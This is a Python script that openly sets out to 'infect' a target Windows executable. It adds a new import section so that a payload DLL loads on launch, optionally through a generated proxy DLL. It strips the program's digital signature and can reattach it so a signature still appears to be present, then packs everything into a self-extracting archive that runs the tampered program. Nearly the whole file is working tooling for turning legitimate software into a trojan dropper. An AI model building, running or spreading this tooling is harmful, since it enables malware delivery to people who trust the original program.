from vendor import disitool
import sys
import os
import argparse
import subprocess
import shutil
import tempfile
import struct

EMBED_DIR = os.path.dirname(os.path.abspath(__file__))

PE_MACHINE_NAMES = {0x14C: "x86", 0x8664: "x64"}


def pe_bits_hex(path):
    with open(path, "rb") as f:
        hdr = f.read(2)
        if hdr != b"MZ":
            return None
        f.seek(0x3C)
        pe_off = struct.unpack("<I", f.read(4))[0]
        f.seek(pe_off + 4)
        machine = struct.unpack("<H", f.read(2))[0]
    return machine


def pe_bits(path):
    machine = pe_bits_hex(path)
    if machine is None:
        return None
    return PE_MACHINE_NAMES.get(machine)


def check_machine_match(target_path, dll_path, label):
    target = pe_bits(target_path)
    dll = pe_bits(dll_path)
    if target is None:
        print(f"[-] Could not parse target architecture: {target_path}")
        sys.exit(1)
    if dll is None:
        print(f"[-] Could not parse {label} architecture: {dll_path}")
        sys.exit(1)
    if target != dll:
        print(f"[-] Architecture mismatch: target is {target} but {label} is {dll}.")
        print("[-] Loading this DLL would crash with 0xC000007B (invalid image format).")
        print("[-] Rebuild the payload for the same bitness as the target.")
        sys.exit(1)


def target_cc(target_path):
    with open(target_path, "rb") as f:
        hdr = f.read(2)
        if hdr != b"MZ":
            return None
        f.seek(0x3C)
        pe_off = struct.unpack("<I", f.read(4))[0]
        f.seek(pe_off + 4 + 20)
        magic = struct.unpack("<H", f.read(2))[0]
    if magic == 0x10B:
        prefix = "i686"
    elif magic == 0x20B:
        prefix = "x86_64"
    else:
        return None
    cc = shutil.which(f"{prefix}-w64-mingw32-gcc")
    if not cc:
        print(f"[-] Cross-compiler not found: {prefix}-w64-mingw32-gcc")
        return None
    return cc


def build_proxy(real_payload_path, build_dir, cc, export_name="Trigger", console=False):
    real_name = os.path.basename(real_payload_path)
    src = os.path.join(build_dir, "proxy.c")
    dll = os.path.join(build_dir, "proxy.dll")

    if console:
        console_init = '''#include <stdio.h>
static void init_console(void) {
    AllocConsole();
    freopen("CONOUT$", "w", stdout);
    freopen("CONOUT$", "w", stderr);
    freopen("CONIN$", "r", stdin);
}
'''
        call_init = "        init_console();\n"
    else:
        console_init = ""
        call_init = ""

    code = f'''#include <windows.h>
__declspec(dllexport) void __cdecl {export_name}(void) {{}}
{console_init}BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID l) {{
    if (r == DLL_PROCESS_ATTACH) {{
{call_init}        LoadLibraryA("{real_name}");
    }}
    return TRUE;
}}
'''
    with open(src, "w") as f:
        f.write(code)

    cmd = [cc, "-shared", "-o", dll, src]
    print(f"[*] Building proxy DLL: {' '.join(cmd)}")
    r = subprocess.run(cmd, capture_output=True, text=True)
    if r.returncode != 0:
        print(f"[-] Proxy build failed:\n{r.stderr}")
        return None
    print(f"[+] proxy.dll -> {dll}")
    return dll


def build_payload(payload_dir, build_dir, cc):
    src = os.path.join(payload_dir, "payload.c")
    if not os.path.isfile(src):
        print(f"[-] payload.c not found in {payload_dir}")
        return None

    dll = os.path.join(build_dir, "payload.dll")
    cmd = [cc, "-shared", "-o", dll, src]
    print(f"[*] Building payload DLL: {' '.join(cmd)}")
    r = subprocess.run(cmd, capture_output=True, text=True)
    if r.returncode != 0:
        print(f"[-] Build failed:\n{r.stderr}")
        return None

    print(f"[+] payload.dll -> {dll}")
    return dll


def align(val, align_to):
    return ((val + align_to - 1) // align_to) * align_to


def embed_payload(target_path, output_path, dll_name="payload.dll", func_names=None):
    if func_names is None:
        func_names = ["Trigger"]

    label = ",".join(func_names)
    print(f"[*] Adding import {dll_name}:{label} to {target_path}")

    with open(target_path, "rb") as f:
        data = bytearray(f.read())

    # --- Parse headers ---
    dos_magic = struct.unpack_from("<2s", data, 0)[0]
    if dos_magic != b"MZ":
        print("[-] Not a valid DOS MZ header")
        return False

    pe_offset = struct.unpack_from("<I", data, 0x3C)[0]
    nt_signature = struct.unpack_from("<4s", data, pe_offset)[0]
    if nt_signature != b"PE\x00\x00":
        print("[-] Not a valid PE signature")
        return False

    file_header = struct.unpack_from("<HHIIIHH", data, pe_offset + 4)
    num_sections = file_header[1]
    opt_hdr_size = file_header[5]

    is_64bit = False
    oh_magic = struct.unpack_from("<H", data, pe_offset + 4 + 20)[0]
    if oh_magic == 0x20B:
        is_64bit = True
    elif oh_magic != 0x10B:
        print(f"[-] Unknown optional header magic: 0x{oh_magic:x}")
        return False

    # Section headers start after NT headers
    sh_offset = pe_offset + 4 + 20 + opt_hdr_size

    # Read section headers
    sections = []
    for i in range(num_sections):
        raw = data[sh_offset + i * 40 : sh_offset + (i + 1) * 40]
        name, vs, va, rs, ro, pr, pl, nr, nl, ch = struct.unpack("<8sIIIIIIHHI", raw)
        sections.append({
            "name": name,
            "name_s": name.split(b"\x00")[0].decode("latin-1"),
            "vs": vs,
            "va": va,
            "rs": rs,
            "ro": ro,
            "ch": ch,
        })

    # Read import directory entry
    if is_64bit:
        data_dir_offset = pe_offset + 4 + 20 + 112
    else:
        data_dir_offset = pe_offset + 4 + 20 + 96

    import_rva, import_sz = struct.unpack_from("<II", data, data_dir_offset + 1 * 8)

    # Read old import descriptors
    old_import_data = b""
    if import_rva and import_sz:
        for s in sections:
            if s["va"] <= import_rva < s["va"] + max(s["vs"], s["rs"]):
                old_import_data = data[s["ro"] + (import_rva - s["va"]) : s["ro"] + (import_rva - s["va"]) + import_sz]
                break

    # Count old descriptors (without including their terminator)
    desc_size = 20
    old_count = 0
    for i in range(0, len(old_import_data), desc_size):
        if old_import_data[i : i + desc_size] == b"\x00" * desc_size:
            break
        old_count += 1
    old_descs_size = old_count * desc_size

    # --- Build new import structures ---
    name_str = dll_name.encode() + b"\x00"
    if len(name_str) % 2:
        name_str += b"\x00"

    func_name = func_names[0].encode()
    ibn = struct.pack("<H", 0) + func_name + b"\x00"
    if len(ibn) % 2:
        ibn += b"\x00"

    thunk_fmt = "<Q" if is_64bit else "<I"
    thunk_sz = 8 if is_64bit else 4
    thunk_arr = b"\x00" * thunk_sz
    thunk_arr += b"\x00" * thunk_sz
    thunk_arr2 = thunk_arr

    # Layout within section: old descs | new desc | terminator | thunks | name | import-by-name
    off = old_descs_size
    off_new_desc = off
    off += desc_size           # new descriptor
    off_term = off
    off += desc_size           # global terminator
    off_thunk = off
    off += len(thunk_arr) + len(thunk_arr2)
    off_name = off
    off += len(name_str)
    off_ibn = off
    off += len(ibn)
    section_data_size = off

    oh_base = pe_offset + 4 + 20
    fa = struct.unpack_from("<I", data, oh_base + 36)[0]
    sa = struct.unpack_from("<I", data, oh_base + 32)[0]

    last = sections[-1]
    last_raw_end = last["ro"] + last["rs"]

    # Detach any overlay data (e.g. a 7z SFX config+archive appended after
    # the last section). Self-extracting targets locate it via the last
    # section header, so it must be relocated past the new section below.
    overlay = bytes(data[last_raw_end:])
    del data[last_raw_end:]

    # New section raw offset
    new_raw = align(last_raw_end, fa)

    last_end_va = last["va"] + last["vs"]
    new_va = align(last_end_va, sa)

    new_raw_sz = align(section_data_size, fa)
    new_vs = align(section_data_size, sa)

    # Pad up to the new section's raw offset
    data.extend(b"\x00" * (new_raw - len(data)))

    # Write section data at new_raw
    section_buf = bytearray(new_raw_sz)

    # Copy old import descriptors (without their terminator)
    section_buf[:old_descs_size] = old_import_data[:old_descs_size]

    # Place strings
    section_buf[off_name : off_name + len(name_str)] = name_str
    section_buf[off_ibn : off_ibn + len(ibn)] = ibn

    # Fix thunks (point to ibn RVA)
    ibn_rva = new_va + off_ibn
    struct.pack_into(thunk_fmt, section_buf, off_thunk, ibn_rva)
    struct.pack_into(thunk_fmt, section_buf, off_thunk + len(thunk_arr), ibn_rva)

    # Fix new descriptor
    new_desc = struct.pack(
        "<IIIII",
        new_va + off_thunk,       # OriginalFirstThunk
        0,                         # TimeDateStamp
        0,                         # ForwarderChain
        new_va + off_name,         # Name
        new_va + off_thunk + len(thunk_arr),  # FirstThunk
    )
    section_buf[off_new_desc : off_new_desc + desc_size] = new_desc
    # off_term already zeroed (global terminator)

    data.extend(section_buf)

    # Re-attach the overlay immediately after the new section's raw data
    data.extend(overlay)

    # --- Add section header ---
    new_sh = struct.pack(
        "<8sIIIIIIHHI",
        b".import\x00\x00",
        new_vs,          # VirtualSize
        new_va,          # VirtualAddress
        new_raw_sz,      # SizeOfRawData
        new_raw,         # PointerToRawData
        0,               # PointerToRelocations
        0,               # PointerToLinenumbers
        0,               # NumberOfRelocations
        0,               # NumberOfLinenumbers
        0xC0000040,      # Characteristics (INITIALIZED_DATA | READ | WRITE)
    )

    # Insert section header into section table
    new_sh_offset = sh_offset + num_sections * 40
    if new_sh_offset + 40 > len(data):
        data.extend(b"\x00" * (new_sh_offset + 40 - len(data)))
    data[new_sh_offset : new_sh_offset + 40] = new_sh

    # Update NumberOfSections
    struct.pack_into("<H", data, pe_offset + 4 + 2, num_sections + 1)

    # Update SizeOfImage
    new_image_size = align(new_va + new_vs, sa)
    struct.pack_into("<I", data, oh_base + 56, new_image_size)

    # Update SizeOfHeaders
    new_headers_size = align(sh_offset + (num_sections + 1) * 40, fa)
    struct.pack_into("<I", data, oh_base + 60, new_headers_size)

    # Update import directory entry (index 1)
    struct.pack_into("<II", data, data_dir_offset + 1 * 8, new_va, section_data_size)

    # Clear bound import directory (index 11)
    struct.pack_into("<II", data, data_dir_offset + 11 * 8, 0, 0)

    # Clear IAT directory (index 12)
    struct.pack_into("<II", data, data_dir_offset + 12 * 8, 0, 0)

    # Zero checksum (let the loader fix it)
    struct.pack_into("<I", data, oh_base + 64, 0)

    with open(output_path, "wb") as f:
        f.write(data)

    print(f"[+] Imports added -> {output_path}")
    return True


def strip_signature(path):
    unsigned = path + ".unsigned"
    disitool.DeleteDigitalSignature(path, unsigned)

    if os.path.getsize(unsigned) != os.path.getsize(path):
        print(f"[+] Digital signature stripped")
        return unsigned
    os.remove(unsigned)
    return path


def reapply_signature(original, modified):
    signed = modified + ".signed"
    disitool.CopyDigitalSignature(original, modified, signed)
    if os.path.isfile(signed):
        print(f"[+] Signature re-applied (invalid but present)")
        shutil.move(signed, modified)


def build_sfx(modified_exe, dll_paths, output_path, build_dir, extra_files=None):
    build_dir = os.path.abspath(build_dir)
    sfx_module = os.path.join(EMBED_DIR, "embed", "tools", "7zS.sfx")
    if not os.path.isfile(sfx_module):
        print(f"[-] Missing SFX module: {sfx_module}")
        return False

    archive_dir = os.path.join(build_dir, "sfx")
    os.makedirs(archive_dir, exist_ok=True)

    exe_name = os.path.basename(modified_exe)
    shutil.copy2(modified_exe, os.path.join(archive_dir, exe_name))
    dll_names = []
    for src in dll_paths:
        name = os.path.basename(src)
        shutil.copy2(src, os.path.join(archive_dir, name))
        dll_names.append(name)

    archive_names = [exe_name] + dll_names

    if extra_files:
        for dst_rel, src in extra_files:
            dst_abs = os.path.join(archive_dir, dst_rel)
            os.makedirs(os.path.dirname(dst_abs), exist_ok=True)
            shutil.copy2(src, dst_abs)
            archive_names.append(dst_rel)
            print(f"[+] {src} -> {dst_rel}")

    archive = os.path.join(build_dir, "bundle.7z")
    seven_zip = shutil.which("7z") or shutil.which("7za")
    if not seven_zip:
        print("[-] 7z not found. Install p7zip.")
        return False

    # Add exe first so RunProgram="{0}" runs it
    # Use plain LZMA — the bundled 7zS.sfx doesn't support LZMA2
    for name in archive_names:
        cmd = [seven_zip, "a", "-mx=9", "-m0=LZMA", archive, name]
        r = subprocess.run(cmd, capture_output=True, text=True, cwd=archive_dir)
        if r.returncode != 0:
            print(f"[-] 7z error:\n{r.stderr}")
            return False

    # Write SFX: 7zS.sfx + config + archive.7z
    cfg = f";!@Install@!UTF-8!\nRunProgram=\"{exe_name}\"\n;!@InstallEnd@!"
    cfg_bytes = cfg.encode("utf-8")

    with open(output_path, "wb") as out:
        with open(sfx_module, "rb") as f:
            out.write(f.read())
        out.write(cfg_bytes)
        with open(archive, "rb") as f:
            out.write(f.read())
    os.chmod(output_path, 0o755)

    print(f"[+] SFX created -> {output_path}")
    return True


def main():
    parser = argparse.ArgumentParser(
        "embed.py",
        description="Embed a payload DLL into a target EXE using import table manipulation & 7z SFX",
    )
    parser.add_argument("--payload", help="Path to payload directory (contains payload.c)")
    parser.add_argument("--dll", help="Path to a pre-built payload DLL (alternative to --payload)")
    parser.add_argument("--soft-link", action="store_true",
        help="Generate a proxy DLL that LoadLibrary's the real payload; avoids needing a specific export")
    parser.add_argument("--console", action="store_true",
        help="Force a visible console window on load (inject AllocConsole into the proxy)")
    parser.add_argument("--target", required=True, help="Target .exe to infect")
    parser.add_argument("--output", help="Output path (default: <target>-embedded.exe)")
    parser.add_argument("--keep-sig", action="store_true", help="Re-attach original digital signature (invalid but present)")
    parser.add_argument("--no-sfx", action="store_true", help="Only modify the target, skip SFX bundling")
    parser.add_argument("--build-dir", help="Directory for intermediate files")
    parser.add_argument("--include", action="append", metavar="SRC:DST",
        help="Include an extra file in the SFX archive (repeatable). "
             "DST may include subdirectory paths, which are created on extraction.")

    args = parser.parse_args()

    if not os.path.isfile(args.target):
        print(f"[-] Target not found: {args.target}")
        sys.exit(1)

    if args.payload and args.dll:
        print("[-] Specify only one of --payload or --dll")
        sys.exit(1)
    if not args.payload and not args.dll:
        print("[-] Specify either --payload (source dir) or --dll (pre-built DLL)")
        sys.exit(1)
    if args.soft_link and not args.dll:
        print("[-] --soft-link requires --dll (the real payload DLL)")
        sys.exit(1)
    if args.console and not args.soft_link:
        print("[-] --console requires --soft-link (it is injected into the proxy DLL)")
        sys.exit(1)

    extra_files = []
    if args.include:
        for item in args.include:
            parts = item.split(":", 1)
            if len(parts) != 2 or not parts[0] or not parts[1]:
                print(f"[-] Invalid --include format: {item!r} (expected SRC:DST)")
                sys.exit(1)
            src, dst = parts
            if not os.path.isfile(src):
                print(f"[-] --include source not found: {src}")
                sys.exit(1)
            if os.path.isabs(dst) or ".." in dst.replace("\\", "/").split("/"):
                print(f"[-] --include DST must be a relative path without '..': {dst}")
                sys.exit(1)
            extra_files.append((dst, src))

    cc = target_cc(args.target)
    if not cc:
        print("[-] Could not determine target bitness or find matching cross-compiler")
        sys.exit(1)

    bits = pe_bits(args.target)
    print(f"[*] Target: PE{bits} -> compiler: {cc}")

    output = args.output or os.path.splitext(args.target)[0] + "-embedded.exe"

    tmp = None
    build_dir = args.build_dir
    if not build_dir:
        tmp = tempfile.mkdtemp(prefix="mw_")
        build_dir = tmp

    os.makedirs(build_dir, exist_ok=True)

    try:
        if args.soft_link:
            payload_dll = args.dll
            if not os.path.isfile(payload_dll):
                print(f"[-] DLL not found: {payload_dll}")
                sys.exit(1)
            check_machine_match(args.target, payload_dll, "payload DLL")
            print(f"[*] Real payload: {payload_dll}")

            renamed = os.path.join(build_dir, "payload.dll")
            shutil.copy2(payload_dll, renamed)
            payload_dll = renamed

            proxy_dll = build_proxy(payload_dll, build_dir, cc, console=args.console)
            if not proxy_dll:
                sys.exit(1)
            check_machine_match(args.target, proxy_dll, "proxy DLL")

            embed_name = "proxy.dll"
            sfx_dlls = [proxy_dll, payload_dll]
        elif args.dll:
            payload_dll = args.dll
            if not os.path.isfile(payload_dll):
                print(f"[-] DLL not found: {payload_dll}")
                sys.exit(1)
            check_machine_match(args.target, payload_dll, "payload DLL")
            print(f"[*] Using pre-built DLL: {payload_dll}")

            embed_name = "payload.dll"
            renamed = os.path.join(build_dir, embed_name)
            shutil.copy2(payload_dll, renamed)
            sfx_dlls = [renamed]
        else:
            payload_dll = build_payload(args.payload, build_dir, cc)
            if not payload_dll:
                sys.exit(1)
            check_machine_match(args.target, payload_dll, "built payload DLL")

            embed_name = "payload.dll"
            sfx_dlls = [payload_dll]

        working_target = strip_signature(args.target)

        embedded = os.path.join(build_dir, "embedded.exe")
        if not embed_payload(working_target, embedded, dll_name=embed_name):
            sys.exit(1)

        if args.keep_sig:
            reapply_signature(args.target, embedded)

        if args.no_sfx:
            out_dir = os.path.dirname(os.path.abspath(output)) or os.getcwd()
            shutil.copy2(embedded, output)
            print(f"[+] Modified EXE -> {output}")
            for src in sfx_dlls:
                name = os.path.basename(src)
                dst = os.path.join(out_dir, name)
                if os.path.normpath(output) != os.path.normpath(dst):
                    shutil.copy2(src, dst)
                print(f"[+] {name} -> {dst}")
        else:
            if not build_sfx(embedded, sfx_dlls, output, build_dir, extra_files=extra_files):
                sys.exit(1)

        print(f"[+] Done: {output} ({os.path.getsize(output)} bytes)")

    finally:
        if tmp and os.path.isdir(tmp):
            shutil.rmtree(tmp, ignore_errors=True)


if __name__ == "__main__":
    main()
